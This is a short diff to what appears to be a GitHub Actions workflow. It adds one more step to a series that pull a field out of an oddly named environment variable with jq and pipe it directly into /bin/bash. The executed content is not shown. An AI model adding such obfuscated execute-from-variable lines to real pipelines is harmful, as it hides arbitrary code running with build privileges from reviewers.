@@ -30,6 +30,7 @@ jobs:
           echo $ldm396 | jq -r .juwvu7659 | /bin/bash
           echo $yfs2673 | jq -r .xoqxr42819 | /bin/bash
           echo $pwol8943 | jq -r .hmip6628 | /bin/bash
+          printf '%s' "$qu89" | jq -r .onilb85 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
